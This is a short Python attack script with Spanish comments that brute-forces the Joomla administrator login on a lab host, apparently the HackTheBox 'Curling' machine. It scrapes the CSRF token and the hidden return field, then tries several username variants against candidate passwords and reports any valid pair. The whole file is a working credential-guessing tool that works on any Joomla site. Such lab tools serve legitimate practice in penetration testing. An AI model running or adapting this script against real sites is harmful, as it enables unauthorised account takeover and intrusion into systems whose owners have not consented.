#!/usr/bin/python3

import requests
import signal
import re

# Variables -----------------------.
URL = "http://10.10.10.150/administrator/index.php"

# Funciones -----------------------.
def def_handler(sig, frame):  # Ctrl+C
    print("\nsaLi3ndoo..\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def login(username, password):  # tryLogin
    session = requests.Session()
    r = session.get(URL)

    hidden_return_value = re.findall(r'<input type="hidden" name="return" value="(.*?)"', r.text)[0]
    hidden_csrf_token_value = re.findall(r'<script type="application/json" class="joomla-script-options new">{"csrf.token":"(.*?)"', r.text)[0]

    data_post = {
        "username": username,
        "passwd": password,
        "option": "com_login",
        "task": "login",
        "return": hidden_return_value,
        hidden_csrf_token_value: "1"
    }
    r = session.post(URL, data=data_post)

    if "Username and password do not match or you do not have an account yet" not in r.text:
        print(f"Credenciales válidas: {username}:{password}")
        exit(0)

def main():  # elCentrico
    array_users = ["Super User", "Floris", "plebbe"]
    array_passwords = ["curling2018", "Curling2018!"]

    for username in array_users:
        for password in array_passwords:
            login(username.lower(), password)
            login(username.upper(), password)
            login(username.replace(' ',''), password)
            login(username.replace(' ','').lower(), password)

    print("Ninguna credencial es válida...")

# Inicio del programa -------------.
if __name__ == '__main__':
    main()
